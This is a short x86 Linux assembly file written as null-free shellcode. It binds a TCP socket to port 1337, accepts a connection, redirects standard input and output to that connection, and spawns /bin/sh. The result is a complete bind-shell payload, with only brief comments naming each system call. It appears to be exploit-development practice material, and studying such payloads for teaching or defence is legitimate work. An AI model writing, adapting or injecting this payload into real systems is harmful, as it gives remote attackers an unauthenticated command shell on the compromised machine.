bits 32
section .text
global _start

_start:
	
	; SYS_SOCKET (1) | socket(AF_INET, SOCK_STREAM, 0) = (2, 1, 0)

	xor eax, eax
	xor ecx, ecx
	mov al, 102

	; socket arguments
	socket_args:
		push ecx
		inc ecx
		cmp cl, 2
		jle socket_args

	mov cl, 1
	mov ebx, ecx
	mov ecx, esp

	int 0x80

	mov esi, eax

	; SYS_BIND (2) | bind(sockfd, &saddr, 0x10)
	
	mov al, 102
	inc bl
	xor edx, edx

	; Creating sockaddr structure
	push edx
	push edx
	mov byte [esp], 0x2
	mov word [esp+2], 0x3905 ; Port 1337
	
	; bind arguments
	mov dl, 0x10
	mov ecx, esp
	push edx
	push ecx
	push esi
	mov ecx, esp

	int 0x80

	; SYS_LISTEN (4) | listen(sockfd, 0x10)

	mov al, 102
	add bl, 2

	; listen arguments
	push edx
	push esi
	mov ecx, esp

	int 0x80

	; SYS_ACCEPT (5) | accept(sockfd, NULL, NULL)
	
	mov al, 102
	inc bl
	
	; accept arguments
	xor edx, edx
	push edx
	push edx
	push esi
	mov ecx, esp

	int 0x80

	mov ebx, eax

	; dup2(clientfd, [0,1,2])
	xor ecx, ecx
	duplicate:
		mov al, 63
		int 0x80
		inc cl
		cmp cl, 0x2
		jle duplicate

	; execve("/bin/sh", NULL, NULL)
	
	jmp binsh

	shell:
	mov al, 11
	xor ecx, ecx
	xor edx, edx
	pop ebx

	int 0x80

	binsh:
		call shell
		db "/bin/sh"